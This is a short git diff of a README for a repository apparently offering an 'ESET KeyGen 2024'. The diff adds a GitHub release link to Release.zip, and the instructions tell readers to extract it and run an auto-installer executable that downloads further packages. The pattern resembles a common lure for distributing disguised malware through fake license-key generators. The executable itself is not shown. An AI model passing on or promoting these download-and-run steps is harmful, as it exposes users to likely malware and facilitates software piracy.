@@ -7,11 +7,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/fa8afc63-3905-4353-bfeb-52dac54d2d2e)
-]()
+](https://github.com/ITcattt/ESET-KeyGen-2024/releases/download/V8.534/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/ITcattt/ESET-KeyGen-2024/releases/download/V8.534/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
